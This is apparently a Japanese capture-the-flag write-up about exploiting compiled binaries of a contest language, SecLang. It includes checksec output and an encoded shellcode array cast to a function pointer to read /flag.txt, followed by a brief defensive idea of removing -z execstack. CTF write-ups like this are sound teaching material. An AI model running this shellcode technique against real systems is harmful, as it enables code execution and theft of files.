# SecLang
SecLangというプログラムミング言語のインタプリタとコンパイラとコンパイラのソースコードが配布されました。
SecLangのインタプリタは未定義動作に対して例外を発生させる処理が実装されていますが、配布された初期状態のコンパイラにはそういった例外処理が実装されていませんでした。
各チームのサーバ上でそのようなSecLangをコンパイルし実行できる環境が動いて、各チームのサーバの/flag.txtを読み取り提出することで得点が手に入る　という問題でした。

## 攻撃
SecLangにはキャスト機能があることや、関数ポインタ経由で関数を実行できる仕組みを利用しました。

また、コンパイラが生成するバイナリは以下のようにスタック領域が実行可能領域となっていました。
```
$ checksec ./program.elf
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x4000b0)
    RWX:      Has RWX segments
```

なのでshellcodeをスタック上に配列として保存し、配列のアドレスを関数ポインタとして指定し実行することで、/flag.txtを読むshellcodeを実行できました。
競技中1byte要素の配列を作る方法が分からなかったので、shellcodeを8byte要素の配列に保存しています。
```
func main() {
	shellcode = [5206455252099743723,1150160940181012529,10180404549529986565,15145967043662586932,1134961291673188966,128212131051030533,73394811851409736,1097757632678593807,7363385390746363909,32783537688502636];
	(shellcode as int + 16)();
}
```
## 防御
コンパイラのソースコードが配布されていることを忘れていました。
つまり防御を全くしていませんでした。()

今ルールを確認できないのでアレなんですが、コンパイラのソースコードをアップロードする形でコンパイラが生成するバイナリをセキュアにするようだったそうです。
実行可能ファイル生成時のリンカオプションを指定しているassembler/assmbleファイルも更新できるのであれば、`-z execstack`を削除するだけでshellcode実行は阻止できそうですね。。